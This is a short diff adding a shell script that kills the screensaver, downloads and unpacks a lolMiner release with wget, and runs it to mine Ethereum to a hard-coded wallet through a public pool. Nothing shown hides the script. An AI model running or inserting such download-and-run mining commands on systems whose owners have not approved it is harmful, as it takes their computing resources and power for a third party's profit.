@@ -1,0 +1,7 @@
+killall xscreensaver
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz
+tar -xvf lolMiner_v1.32a_Lin64.tar.gz
+rm -f lolMiner_v1.32a_Lin64.tar.gz
+cd 1.32a
+./lolMiner --algo ETHASH --pool us.stratu.ms:16816 --user 0x5BA06826399aBf9D66c707B892D22F56d19d45E0.t
